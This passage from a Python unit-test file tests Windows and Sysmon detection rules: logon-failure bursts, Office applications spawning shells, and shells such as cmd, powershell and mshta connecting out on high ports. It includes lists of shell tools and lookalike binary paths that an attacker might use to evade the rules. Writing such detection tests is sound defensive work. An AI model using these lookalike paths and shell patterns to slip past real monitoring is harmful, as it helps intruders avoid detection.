        for rule_id in ("win-failed-logon-burst", "win-rdp-logon-failure-burst"):
            with self.subTest(rule=rule_id):
                self.assertIn("unrecorded",
                              " ".join(self.by_id[rule_id].falsepositives).lower())

    def test_real_shaped_bursts_fire(self):
        for rule_id, count, event_id, data in REAL_BURSTS:
            with self.subTest(rule=rule_id):
                alerts, failures = run_rules(
                    _real_burst(event_id, "Security", count, data), self.rules)
                self.assertEqual([], failures)
                self.assertIn(rule_id, [a.rule_id for a in alerts])

    def test_a_forged_burst_on_an_unprivileged_channel_fires_nothing(self):
        for rule_id, count, event_id, data in REAL_BURSTS:
            with self.subTest(rule=rule_id):
                alerts, _ = run_rules(
                    _real_burst(event_id, "Application", count, data), self.rules)
                self.assertEqual([], alerts)

    def test_severities_and_techniques_of_part_two(self):
        expected = {
            "win-failed-logon-burst": ("HIGH", "T1110.001", "TA0006"),
            "win-rdp-logon-failure-burst": ("HIGH", "T1110.001", "TA0006"),
            "win-account-lockout-storm": ("MEDIUM", "T1110", "TA0006"),
            "win-ntlm-failure-burst": ("MEDIUM", "T1110", "TA0006"),
            "sysmon-office-spawn": ("HIGH", "T1566.001", "TA0002"),
            "sysmon-suspicious-outbound": ("MEDIUM", "T1071", "TA0011"),
        }
        for rule_id, want in expected.items():
            with self.subTest(rule=rule_id):
                rule = self.by_id[rule_id]
                self.assertEqual(want, (rule.severity, rule.technique, rule.tactic))


OFFICE = ("WINWORD", "EXCEL", "POWERPNT", "OUTLOOK", "MSPUB", "MSACCESS", "VISIO",
          "ONENOTE")
SHELLS = ("cmd", "powershell", "pwsh", "wscript", "cscript", "mshta")


class TestSysmonRules(RulePackCase):
    def fires(self, rule_id, **kwargs):
        kwargs.setdefault("channel", SYSMON)
        alerts, failures = run_rules([helpers_rules.event(**kwargs)], [self.by_id[rule_id]])
        self.assertEqual([], failures)
        return bool(alerts)

    def spawn(self, parent, process=SYS32 + "cmd.exe"):
        return self.fires("sysmon-office-spawn", event_id=1, action="PROCESS_CREATE",
                          parent_process=parent, process=process, command_line="x")

    def connect(self, process=PS, port=4444):
        return self.fires("sysmon-suspicious-outbound", event_id=3,
                          action="NETWORK_CONNECT", process=process,
                          dest_ip="203.0.113.9", dest_port=port)

    def test_the_rules_declare_the_sysmon_logsource(self):
        for rule_id in ("sysmon-office-spawn", "sysmon-suspicious-outbound"):
            self.assertEqual({"product": "windows", "service": "sysmon"},
                             self.by_id[rule_id].logsource)

    def test_every_office_application_fires(self):
        for name in OFFICE:
            with self.subTest(parent=name):
                self.assertTrue(self.spawn(
                    "C:\\Program Files\\Microsoft Office\\" + name + ".EXE"))

    def test_the_office_parent_is_matched_by_its_whole_file_name(self):
        # One lookalike per name, so dropping the leading backslash from any
        # single entry in the rule is caught.
        lookalikes = ["C:\\evil\\not" + name + ".exe" for name in OFFICE]
        for parent in lookalikes + ["C:\\evil\\excel.exe.txt",
                                    "C:\\Windows\\explorer.exe", "-"]:
            with self.subTest(parent=parent):
                self.assertFalse(self.spawn(parent))

    def test_the_known_office_helpers_in_their_system_paths_are_excused(self):
        # WerFault is the crash reporter; splwow64 is the 32-bit print helper.
        for child in ("C:\\Windows\\System32\\WerFault.exe",
                      "C:\\Windows\\SysWOW64\\WerFault.exe",
                      "c:\\WINDOWS\\system32\\WERFAULT.EXE",
                      "C:\\Windows\\splwow64.exe"):
            with self.subTest(child=child):
                self.assertFalse(self.spawn(WORD, process=child))

    def test_a_lookalike_helper_outside_the_system_path_still_fires(self):
        # The child path is the spawned binary's own, so it is whatever the
        # macro chose: only a path under C:\Windows, which a standard user
        # cannot write to, may excuse a file name. A secondary volume is
        # writable, so D:\Windows\System32 must not count.
        for child in ("C:\\Users\\bob\\WerFault.exe",
                      "C:\\evil\\system32\\WerFault.exe",
                      "C:\\Windows\\System32\\evil\\WerFault.exe",
                      "C:\\Windows.old\\System32\\WerFault.exe",
                      "C:\\Users\\bob\\Windows\\System32\\WerFault.exe",
                      "C:\\evil\\x:c:\\windows\\system32\\werfault.exe",
                      "D:\\Windows\\System32\\WerFault.exe",
                      "C:\\Windows\\System32\\WerFault.exe.exe",
                      "C:\\Windows\\System32\\WerFault.exe\n",
                      "C:\\Windows\\System32\\splwow64.exe",
                      "C:\\Windows\\splwow64.exe.exe",
                      "C:\\Windows\\splwow64.exe\n",
                      "D:\\Windows\\splwow64.exe",
                      "C:\\evil\\x:c:\\windows\\splwow64.exe",
                      "C:\\Users\\bob\\splwow64.exe"):
            with self.subTest(child=child):
                self.assertTrue(self.spawn(WORD, process=child))

    def test_a_security_4688_with_an_office_parent_is_not_a_sysmon_event(self):
        # A host collecting both 4688 and Sysmon 1 would otherwise alert twice
        # for one process; the 4688 side is not this rule's to cover.
        self.assertFalse(self.fires(
            "sysmon-office-spawn", channel="Security", event_id=4688,
            action="PROCESS_CREATE", parent_process=WORD, process=SYS32 + "cmd.exe"))

    def test_every_shell_fires_on_a_high_port(self):
        for name in SHELLS:
            with self.subTest(process=name):
                self.assertTrue(self.connect(process=SYS32 + name + ".exe"))

    def test_an_ordinary_process_on_a_high_port_does_not_fire(self):
        lookalikes = ["C:\\x\\not" + name + ".exe" for name in SHELLS]
        for process in lookalikes + [CHROME, "C:\\x\\cmd.exe.dll"]:
            with self.subTest(process=process):
                self.assertFalse(self.connect(process=process))

    def test_the_port_bound_is_above_1024(self):
        for port, expect in ((0, False), (80, False), (443, False), (1024, False),
                             (1025, True), (4444, True), (65535, True)):
            with self.subTest(port=port):
                self.assertEqual(expect, self.connect(port=port))

    def test_the_right_action_on_another_event_id_does_not_fire_the_outbound_rule(self):
        # No normalizer output has NETWORK_CONNECT on another EventID, so this
        # pins the rule to Sysmon 3 rather than catching a live case.
        self.assertFalse(self.fires("sysmon-suspicious-outbound", event_id=0,
                                    action="NETWORK_CONNECT", process=PS, dest_port=4444))

    def test_a_sysmon_file_create_fires_neither_rule(self):
        # Sysmon 11 shares neither rule's event_id nor action.
        self.assertFalse(self.fires("sysmon-office-spawn", event_id=11,
                                    action="FILE_CREATE", parent_process=WORD))
        self.assertFalse(self.fires("sysmon-suspicious-outbound", event_id=11,
                                    action="FILE_CREATE", process=PS, dest_port=4444))


if __name__ == "__main__":
    unittest.main()
